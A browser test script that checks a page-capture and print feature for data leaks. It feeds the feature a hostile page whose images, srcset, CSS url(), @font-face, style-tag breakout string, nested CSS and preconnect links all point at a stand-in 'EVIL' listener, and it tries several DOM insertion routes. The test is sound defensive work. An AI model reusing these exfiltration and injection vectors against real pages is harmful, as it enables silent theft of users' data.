/**
 * Real-browser check that a personal page's picture and print reach no other server.
 *
 * jsdom cannot draw a page or load an image, so this runs the shipped code in Chrome. It serves
 * the built frame runtime as /assets would, loads a hostile page (off-site img, srcset, url(),
 * @font-face, the \3c/style\3e trick, nested CSS, a preconnect link), takes FACO's picture, prints
 * the page's raw markup, and fails if anything reaches the listener it runs on 127.0.0.1:8098, or
 * if an off-origin request fails for any reason but a policy block.
 *
 * LEAK_CHECK_CONTROL=1 makes the harness page itself request the listener once, outside the code
 * under test: the run must then fail, which shows the check can.
 *
 *   npm run build                                  # builds public/js/fac_page_frame*.js
 *   npx vite build -c scripts/page-frame-leak-check/vite.config.mjs
 *   npm i --no-save playwright-core@1.56.1
 *   CHROME=/path/to/chrome node scripts/page-frame-leak-check/run.mjs
 */
import { createServer } from "node:http";
import { readFileSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { chromium } from "playwright-core";

const HERE = import.meta.dirname;
const PUBLIC_JS = resolve(HERE, "../../../../public/js");
const PORT = 8097;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const EVIL = "http://127.0.0.1:8098";

const FILES = {
	"/": ["text/html", '<!doctype html><meta charset="utf-8"><body><script src="/harness.js"></script>'],
	"/harness.js": ["text/javascript", () => readFileSync(resolve(HERE, "dist/harness.js"))],
	"/assets/frappe_assistant_core/js/fac_page_frame.js": ["text/javascript", () => readFileSync(resolve(PUBLIC_JS, "fac_page_frame.js"))],
	"/assets/frappe_assistant_core/js/fac_page_charts.js": ["text/javascript", () => readFileSync(resolve(PUBLIC_JS, "fac_page_charts.js"))],
};

const HOSTILE_HTML = [
	`<p>Salary total 70,29,354</p><table><tr><td>India</td><td>74%</td></tr></table>`,
	`<img src="${EVIL}/img?d=secret"><img srcset="${EVIL}/srcset 2x">`,
	`<div style="width:50px;height:50px;background:url(${EVIL}/bg)"></div>`,
	`<div class="chart" style="height:120px"></div>`,
].join("");
const HOSTILE_SCRIPT = `
const style = document.createElement("style");
style.textContent = '@font-face{font-family:leak;src:url(${EVIL}/font)} .x{font-family:leak} ' +
	'.a{content:"\\\\3c/style\\\\3e<img src=${EVIL}/breakout>"} .n{color:red; & .m{background:url(${EVIL}/nested)}}';
document.head.append(style);
root_element.insertAdjacentHTML("beforeend", '<p class="x a n"><span class="m">x</span></p><link rel="preconnect" href="${EVIL}/pre">');
fac.chart(root_element.querySelector(".chart"), {xAxis: {type: "category", data: ["A", "B"]}, yAxis: {}, series: [{type: "bar", data: [3, 5]}]});
`;

// Anything that arrives here left the page: the check fails on any hit.
const hits = [];
const listener = createServer((req, res) => {
	hits.push(req.url);
	res.writeHead(204).end();
}).listen(8098, "127.0.0.1");

const server = createServer((req, res) => {
	const file = FILES[req.url.split("?")[0]];
	if (!file) return res.writeHead(404).end();
	res.writeHead(200, { "Content-Type": file[0] }).end(typeof file[1] === "function" ? file[1]() : file[1]);
}).listen(PORT, "127.0.0.1");

const browser = await chromium.launch({ executablePath: process.env.CHROME });
const page = await browser.newPage();
// An off-origin request that failed for any reason but a policy block may have gone out.
const LOCAL = /^(http:\/\/127\.0\.0\.1:8097|data:|blob:|about:)/;
const offsite = [];
page.on("requestfailed", (r) => {
	const reason = r.failure()?.errorText || "";
	if (!LOCAL.test(r.url()) && !/csp|ERR_BLOCKED_BY_CLIENT|ERR_BLOCKED_BY_RESPONSE/i.test(reason)) offsite.push(`${r.url()} ${reason}`);
});
page.on("response", (r) => {
	if (!LOCAL.test(r.url())) offsite.push(r.url());
});
await page.goto(`${ORIGIN}/`);
if (process.env.LEAK_CHECK_CONTROL === "1") await page.evaluate((e) => fetch(`${e}/control`, { mode: "no-cors" }), EVIL);
const shot = await page.evaluate((p) => window.captureHostilePage(p), { title: "x", html: HOSTILE_HTML, style: "", script: HOSTILE_SCRIPT });
// Inside the page's own frame, each insertion route tries to land a <link>; it is looked for at
// once, before the MutationObserver could act, so only the synchronous guard is tested here.
const pageFrame = page.frames().find((f) => f.url() === "about:srcdoc" && f.parentFrame()?.url() === "about:srcdoc");
const guardRoutes = await pageFrame.evaluate(() => {
	const markup = '<i>x</i><link rel="preconnect" href="//guard.invalid">';
	const content = () => {
		const t = document.createElement("template");
		t.innerHTML = markup;
		return t.content;
	};
	const box = document.body.appendChild(document.createElement("div"));
	const landed = () => {
		const found = !!document.querySelector("link[rel=preconnect]") || !!box.shadowRoot?.querySelector("link");
		document.querySelectorAll("link[rel=preconnect]").forEach((l) => l.remove());
		box.replaceChildren();
		return found;
	};
	const routes = {
		append: () => box.append(content()),
		importNode: () => box.append(document.importNode(content(), true)),
		cloneNode: () => box.append(content().cloneNode(true)),
		setHTMLUnsafe: () => box.setHTMLUnsafe?.(markup),
		parseHTMLUnsafe: () => Document.parseHTMLUnsafe && box.append(document.adoptNode(Document.parseHTMLUnsafe(markup).body)),
		createHTMLDocument: () => {
			const other = document.implementation.createHTMLDocument("x");
			const t = other.createElement("template");
			t.innerHTML = markup;
			box.append(document.adoptNode(t.content));
		},
		shadowSetHTMLUnsafe: () => box.attachShadow({ mode: "open" }).setHTMLUnsafe?.(markup),
		xslt: () => typeof XSLTProcessor !== "undefined" && "present",
	};
	const out = {};
	for (const [name, run] of Object.entries(routes)) {
		try {
			const value = run();
			out[name] = value === "present" ? "XSLT present" : landed() ? "LANDED" : "stripped";
		} catch (error) {
			out[name] = `refused: ${String(error.message).slice(0, 40)}`;
		}
	}
	return out;
});
await page.evaluate((html) => window.printRawMarkup(html), HOSTILE_HTML + '<link rel="stylesheet" href="' + EVIL + '/sheet.css"><style>@import url(' + EVIL + "/import.css)</style>");
const breakout = await page.evaluate(
	(e) => window.cleanSnapshot(`<style>.a{content:"\\3c/style\\3e<img src=${e}/b>"} .n{color:red; & .m{background:url(${e}/n)}}</style>`),
	EVIL,
);
await page.waitForTimeout(2500);
await browser.close();
server.close();
listener.close();

// The picture, to look at: it should show the figures and the chart.
if (shot.image) writeFileSync(resolve(HERE, "dist/capture.jpg"), Buffer.from(shot.image, "base64"));
const result = { capture: { ...shot, image: undefined }, cleanedBreakout: breakout, guardRoutes, listenerHits: hits, offsiteRequests: offsite };
console.log(JSON.stringify(result, null, 2));
// The breakout may stay as escaped text inside a CSS string; it must never become an element.
const leaked = !shot.ok || Object.values(guardRoutes).some((v) => /LANDED|present/.test(v)) || hits.length > 0 || offsite.length > 0 || /<img/i.test(breakout.replace(/<style>[\s\S]*?<\/style>/g, "")) || !shot.text?.includes("70,29,354");
process.exit(leaked ? 1 : 0);
